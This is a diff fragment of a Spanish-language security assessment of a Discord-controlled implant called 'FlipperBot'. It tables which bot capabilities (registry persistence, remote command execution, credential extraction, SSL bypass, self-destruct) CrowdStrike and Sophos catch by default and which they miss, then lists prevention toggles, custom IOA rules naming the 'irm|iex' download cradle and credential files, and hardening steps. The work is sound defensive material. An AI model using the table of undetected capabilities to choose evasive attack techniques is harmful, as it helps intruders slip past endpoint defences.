+| 5. Python Portable | Custom IOA necesaria | Application Control (Python) | Solo Sophos si se habilita App Control |
+| 6. Registry Run Key | Suspicious Registry Ops (OFF) | Threat Protection + Adaptive | Solo si se habilita |
+| 7. Discord C2 | Custom IOA (Domain Name) | Web Control (bloquear Discord) | Solo con reglas custom |
+| 8-9. !ping/!info | No detectable | No detectable | **No** |
+| 10. !screenshot | No detectable | No detectable | **No** |
+| 11-12. !say/!notify | Custom IOA posible | No detectable | Poco probable |
+| 13. !cmd | Suspicious Processes (OFF) | Threat Protection | Solo si se habilita |
+| 14. !ps | Script Monitoring + AMSI (OFF) | AMSI | Solo si se habilita |
+| 15. !download | Custom IOA (file read NO soportado) | No DLP nativo | **No** |
+| 16. !upload | Custom IOA (file write) | Proxy SSL **YA BLOQUEA** | Sophos SI bloquea |
+| 17. !creds | Code Injection toggle (OFF) | Exploit Mitigation (parcial) | Solo si se habilita |
+| 18. Watchdog | No detectable | No detectable | **No** |
+| 19. Selfdestruct | Suspicious Registry Ops (OFF) | Adaptive Attack Protection | Solo si se habilita |
+| 20. SSL Bypass | No detectable | No detectable | **No** |
+
+> **Conclusion:** La mayoria de los toggles de CrowdStrike que detectarian FlipperBot estan **OFF por defecto** (65 toggles de prevencion, la mayoria deshabilitados). Sophos tiene AMSI activo para PowerShell pero **NO cubre Python**, y su Application Control requiere configuracion manual.
 
 ---
 
@@ -718,10 +1070,39 @@ ssl.create_default_context = _no_verify_ctx
 
 ## Recomendaciones
 
-1. **Configurar politicas de prevencion** (no solo deteccion) para `irm | iex` y `-EncodedCommand`
-2. **Monitorear claves de registro Run** para entradas que ejecuten PowerShell oculto
-3. **Alertar sobre DLL injection** — `CreateRemoteThread` en procesos de navegador
-4. **Restringir dispositivos USB HID** mediante politicas de grupo o control de dispositivos
-5. **Implementar allowlisting de aplicaciones** — Python desde AppData no deberia ejecutarse
-6. **Monitorear conexiones WebSocket** a Discord desde procesos no autorizados
-7. **Habilitar PowerShell Script Block Logging** y Module Logging
+### CrowdStrike — Toggles a Habilitar (Prevention Policy)
+
+| # | Toggle | Que detecta de FlipperBot |
+|---|---|---|
+| 1 | **Suspicious Scripts and Commands** | Download cradle `irm|iex`, `-EncodedCommand` |
+| 2 | **Script-Based Execution Monitoring** | Todo script PowerShell ejecutado por el bot |
+| 3 | **AMSI** | Contenido de scripts antes de ejecucion |
+| 4 | **Suspicious Registry Operations** | Persistencia en Run Key + eliminacion en selfdestruct |
+| 5 | **Code Injection** | DLL injection de `creds_extractor.exe` en Chrome |
+| 6 | **Credential Dumping** | Acceso a Login Data y DPAPI |
+| 7 | **Suspicious Processes** | Python.exe y cmd.exe desde AppData |
+
+### CrowdStrike — Custom IOA Rules a Crear
+
+| # | Tipo | Regla |
+|---|---|---|
+| 1 | Domain Name | `gateway.discord.gg` desde proceso != `Discord.exe` |
+| 2 | Process Creation | `python.exe` desde `%APPDATA%` |
+| 3 | Process Creation | `cmd.exe` o `powershell.exe` hijo de `python.exe` en AppData |
+| 4 | File Creation | `creds_*.txt` por cualquier proceso |
+
+### Sophos — Configuraciones a Habilitar
+
+| # | Politica | Que detecta de FlipperBot |
+|---|---|---|
+| 1 | **Application Control → Python** | Bloquea ejecucion de Python portable (toda la cadena se rompe) |
+| 2 | **Threat Protection → Detect malicious behavior** (verificar nivel) | Cadenas de proceso sospechosas |
+| 3 | **Peripheral Control** | Dispositivos USB no autorizados |
+| 4 | **Web Control → Bloquear Discord** | Corta el canal C2 completamente |
+
+### Medidas Generales
+
+1. **Habilitar PowerShell Script Block Logging** (GPO) y Module Logging
+2. **Habilitar Sysmon** — Event ID 1 (Process Create), 7 (Image Loaded), 8 (CreateRemoteThread), 13 (Registry)
+3. **Restringir ejecucion desde AppData** via AppLocker o WDAC
+4. **Monitorear dispositivos USB HID** via GPO + Device Installation Restrictions
